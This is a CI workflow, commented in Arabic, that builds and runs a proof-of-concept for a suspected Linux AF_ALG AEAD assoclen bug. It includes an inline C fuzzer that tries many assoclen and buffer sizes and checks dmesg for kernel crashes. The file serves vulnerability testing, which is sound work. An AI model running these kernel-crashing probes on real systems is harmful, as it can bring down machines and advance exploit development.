name: AF_ALG Vulnerability PoC

on:
  push:
  workflow_dispatch:

jobs:

  # ══════════════════════════════════════════════════════════════
  # JOB 1 — بناء الـ PoC والتحقق من AF_ALG support
  # ══════════════════════════════════════════════════════════════
  build-and-check:
    name: "① Build PoC + Check kernel config"
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: sudo apt-get install -y gcc libssl-dev

      - name: Check kernel CONFIG_CRYPTO_USER_API_AEAD
        run: |
          echo "=== Kernel version ==="
          uname -r

          echo ""
          echo "=== AF_ALG crypto config ==="
          CONFIG="/boot/config-$(uname -r)"
          if [ -f "$CONFIG" ]; then
            grep -E "CONFIG_CRYPTO_USER_API" "$CONFIG"
          elif [ -f /proc/config.gz ]; then
            zcat /proc/config.gz | grep -E "CONFIG_CRYPTO_USER_API"
          else
            echo "Config not found, will test directly"
          fi

      - name: Build PoC
        run: gcc -O0 -Wall -o poc_aead poc_aead_assoclen.c && echo "✅ Build OK"

      - name: Upload binary
        uses: actions/upload-artifact@v4
        with:
          name: poc-binary
          path: poc_aead

  # ══════════════════════════════════════════════════════════════
  # JOB 2 — تشغيل الـ PoC وقراءة النتيجة
  # ══════════════════════════════════════════════════════════════
  run-poc:
    name: "② Run PoC — does it crash or return EINVAL?"
    runs-on: ubuntu-latest
    needs: build-and-check
    steps:
      - uses: actions/checkout@v4

      - name: Build
        run: gcc -O0 -Wall -o poc_aead poc_aead_assoclen.c

      - name: Capture dmesg before
        run: sudo dmesg | tail -5 > dmesg_before.txt || true

      - name: Run PoC
        id: run_poc
        run: |
          echo "=== Running PoC ==="
          timeout 30 ./poc_aead 2>&1 | tee poc_output.txt
          echo "exit_code=$?" >> $GITHUB_OUTPUT

      - name: Capture dmesg after
        run: |
          sudo dmesg | tail -20 > dmesg_after.txt || true
          echo "=== dmesg diff (new kernel messages) ==="
          diff dmesg_before.txt dmesg_after.txt || true

      - name: Analyze result
        run: |
          echo "=== PoC Output ==="
          cat poc_output.txt

          echo ""
          echo "=== Verdict ==="

          if grep -q "PROTECTED" poc_output.txt; then
            echo "✅ SAFE: Kernel returned EINVAL — vulnerability is mitigated"

          elif grep -q "Kernel panic\|BUG:\|NULL pointer\|general protection" dmesg_after.txt; then
            echo "🔴 VULNERABLE: Kernel panic detected in dmesg!"
            echo "=== Crash details ==="
            grep -A 20 "BUG:\|NULL pointer\|general protection" dmesg_after.txt

          elif grep -q "SIGSEGV\|Segmentation\|killed" poc_output.txt; then
            echo "🔴 VULNERABLE: Process killed by kernel — likely NULL deref"

          elif grep -q "EFAULT\|14" poc_output.txt; then
            echo "⚠️  POSSIBLE: Got EFAULT — memory access issue"

          else
            echo "❓ UNKNOWN: Review output manually"
          fi

      - name: Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: poc-results
          path: |
            poc_output.txt
            dmesg_after.txt

  # ══════════════════════════════════════════════════════════════
  # JOB 3 — اختبار حدود مختلفة (fuzz بسيط)
  # ══════════════════════════════════════════════════════════════
  boundary-fuzz:
    name: "③ Boundary testing — different assoclen values"
    runs-on: ubuntu-latest
    needs: build-and-check
    steps:
      - uses: actions/checkout@v4

      - name: Build fuzzer
        run: |
          cat << 'FUZZ' > fuzz_assoclen.c
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <unistd.h>
          #include <errno.h>
          #include <sys/socket.h>
          #include <linux/if_alg.h>

          #ifndef SOL_ALG
          #define SOL_ALG 279
          #endif

          #define KEY_LEN  16
          #define IV_LEN   12
          #define TAG_LEN  16

          /* اختبار assoclen معين مقابل rx_size معين */
          static const char* test_case(uint32_t assoclen, size_t rx_size) {
              struct sockaddr_alg sa = {
                  .salg_family = AF_ALG,
                  .salg_type   = "aead",
                  .salg_name   = "gcm(aes)",
              };
              int sfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
              if (sfd < 0) return "NO_SOCKET";

              if (bind(sfd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
                  close(sfd); return "BIND_FAIL";
              }

              uint8_t key[KEY_LEN] = {0};
              setsockopt(sfd, SOL_ALG, ALG_SET_KEY, key, KEY_LEN);
              setsockopt(sfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, TAG_LEN);

              int cfd = accept(sfd, NULL, 0);
              if (cfd < 0) { close(sfd); return "ACCEPT_FAIL"; }

              /* TX */
              size_t tx_size = assoclen + 32;
              uint8_t *tx = calloc(1, tx_size);

              /* Simple CMSG */
              struct {
                  char iv_cmsg[CMSG_SPACE(sizeof(struct af_alg_iv) + IV_LEN)];
                  char op_cmsg[CMSG_SPACE(sizeof(uint32_t))];
                  char al_cmsg[CMSG_SPACE(sizeof(uint32_t))];
              } cb;
              memset(&cb, 0, sizeof(cb));

              struct cmsghdr *c = (struct cmsghdr*)cb.iv_cmsg;
              c->cmsg_level = SOL_ALG; c->cmsg_type = ALG_SET_IV;
              c->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv)+IV_LEN);
              ((struct af_alg_iv*)CMSG_DATA(c))->ivlen = IV_LEN;

              c = (struct cmsghdr*)cb.op_cmsg;
              c->cmsg_level = SOL_ALG; c->cmsg_type = ALG_SET_OP;
              c->cmsg_len = CMSG_LEN(sizeof(uint32_t));
              *(uint32_t*)CMSG_DATA(c) = ALG_OP_ENCRYPT;

              c = (struct cmsghdr*)cb.al_cmsg;
              c->cmsg_level = SOL_ALG; c->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
              c->cmsg_len = CMSG_LEN(sizeof(uint32_t));
              *(uint32_t*)CMSG_DATA(c) = assoclen;

              struct iovec iov = {tx, tx_size};
              struct msghdr mt = {0};
              mt.msg_iov = &iov; mt.msg_iovlen = 1;
              mt.msg_control = &cb; mt.msg_controllen = sizeof(cb);
              sendmsg(cfd, &mt, 0);

              /* RX */
              uint8_t *rx = calloc(1, rx_size + 1);
              struct iovec riov = {rx, rx_size};
              struct msghdr mr = {0};
              mr.msg_iov = &riov; mr.msg_iovlen = 1;
              ssize_t ret = recvmsg(cfd, &mr, 0);

              free(tx); free(rx);
              close(cfd); close(sfd);

              if (ret > 0)       return "OK";
              if (errno == EINVAL) return "EINVAL(safe)";
              if (errno == EMSGSIZE) return "EMSGSIZE";
              if (errno == EFAULT)   return "EFAULT(!)";
              return "OTHER";
          }

          int main(void) {
              /* جدول: assoclen × rx_size */
              uint32_t assoclens[] = {0, 16, 100, 1000, 4000};
              size_t   rxsizes[]   = {10, 16, 100, 1000, 8000};
              int na = sizeof(assoclens)/sizeof(assoclens[0]);
              int nr = sizeof(rxsizes)/sizeof(rxsizes[0]);

              printf("%-12s", "assoc\\rx");
              for (int j=0; j<nr; j++) printf(" %8zu", rxsizes[j]);
              printf("\n");
              printf("%s\n", "------------------------------------------------------");

              for (int i=0; i<na; i++) {
                  printf("%-12u", assoclens[i]);
                  for (int j=0; j<nr; j++) {
                      const char *r = test_case(assoclens[i], rxsizes[j]);
                      printf(" %8s", r);
                  }
                  printf("\n");
              }
              printf("\nKey: EINVAL(safe)=protected, EFAULT=memory issue, OK=success\n");
              return 0;
          }
          FUZZ
          gcc -O0 -Wall -o fuzz_assoclen fuzz_assoclen.c && echo "✅ Fuzzer built"

      - name: Run boundary fuzz
        run: |
          echo "=== assoclen × rx_buffer boundary matrix ==="
          sudo dmesg > dmesg_pre.txt 2>/dev/null || true
          timeout 60 ./fuzz_assoclen 2>&1
          echo ""
          echo "=== New kernel messages after fuzz ==="
          sudo dmesg > dmesg_post.txt 2>/dev/null || true
          diff dmesg_pre.txt dmesg_post.txt | grep "^>" | head -20 || echo "(no new messages)"

      - name: Upload fuzz results
        uses: actions/upload-artifact@v4
        with:
          name: fuzz-results
          path: dmesg_post.txt
